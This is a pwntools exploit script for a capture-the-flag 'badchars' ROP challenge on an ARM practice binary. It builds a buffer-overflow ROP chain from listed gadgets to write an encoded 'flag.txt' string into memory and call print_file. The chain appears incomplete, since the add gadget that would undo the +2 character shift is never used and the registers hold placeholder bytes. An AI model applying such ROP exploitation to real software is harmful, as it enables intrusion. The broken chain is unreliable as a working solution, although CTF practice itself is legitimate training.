from pwn import *

BINARY = "./badchars_armv5-hf"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "arm"
context.binary = BINARY

p = process(BINARY)

"""
BAD CHARS = '.', 'a', 'g', 'x'
--> 0x2e, 0x61, 0x67, 0x78

-----------------------------------------------------
   105f0:	e5951000 	ldr	r1, [r5]
   105f4:	e0411006 	sub	r1, r1, r6
   105f8:	e5851000 	str	r1, [r5]
   105fc:	e8bd8001 	pop	{r0, pc}
-----------------------------------------------------
   10600:	e5951000 	ldr	r1, [r5]
   10604:	e0811006 	add	r1, r1, r6
   10608:	e5851000 	str	r1, [r5]
   1060c:	e8bd8001 	pop	{r0, pc}
-----------------------------------------------------
   10610:	e5843000 	str	r3, [r4]
   10614:	e8bd8060 	pop	{r5, r6, pc}
-----------------------------------------------------
   10618:	e5951000 	ldr	r1, [r5]
   1061c:	e0211006 	eor	r1, r1, r6
   10620:	e5851000 	str	r1, [r5]
   10624:	e8bd8001 	pop	{r0, pc}
"""

str_r3_ptr_r4 = p32(0x10610) # 
add_ptr_r5_r6 = p32(0x10604) # 
pop_r0_pc     = p32(0x105fc) # pop {r0, pc}
pop_r3_pc     = p32(0x10484) # pop {r3, pc}
pop_r4_pc     = p32(0x105b0) # pop {r4, pc}
bl_print_file = p32(0x105E0) # bl print_file --> works with 0x104C0 <print_file@plt>
data_adr      = 0x21024

rop = b"A" * 36

rop += pop_r3_pc
rop += b"hnci" # "flag" + 2 on each letter
rop += pop_r4_pc
rop += p32(data_adr)

rop += str_r3_ptr_r4
rop += b"BBBB" # r5
rop += b"CCCC" # r6

rop += pop_r3_pc
rop += b"0vzv" # ".txt" + 2 on each letter
rop += pop_r4_pc
rop += p32(data_adr+4)

rop += str_r3_ptr_r4
rop += b"DDDD"
rop += b"EEEE"

rop += pop_r0_pc
rop += p32(data_adr)
rop += bl_print_file

pause()
p.sendline(rop)
log.success(f"ROPchain = {rop}")

flag = p.recvall(timeout=1).split(b'\n')#[-2]
log.success(f"FLAG : {flag}")
